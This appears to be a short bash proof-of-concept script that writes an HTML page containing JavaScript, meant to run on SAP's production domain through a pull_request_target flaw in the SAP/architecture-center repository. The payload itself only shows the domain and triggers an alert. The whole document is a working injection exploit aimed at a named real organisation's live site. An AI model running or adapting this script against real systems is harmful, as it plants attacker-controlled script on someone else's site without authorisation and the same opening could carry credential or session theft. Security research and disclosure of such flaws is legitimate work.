#!/bin/bash
# XSS PoC — creates a new page on SAP's domain, harms nothing existing
mkdir -p static
cat > static/poc.html << 'XEOF'
<!DOCTYPE html>
<html>
<head><title>Security Research PoC</title></head>
<body>
<h1>XSS Proof of Concept</h1>
<p>This page demonstrates arbitrary JavaScript execution on SAP's production domain via pull_request_target vulnerability in SAP/architecture-center.</p>
<p>Domain: <span id="d"></span></p>
<script>
document.getElementById('d').textContent = document.domain;
alert(document.domain);
</script>
</body>
</html>
XEOF
exit 0
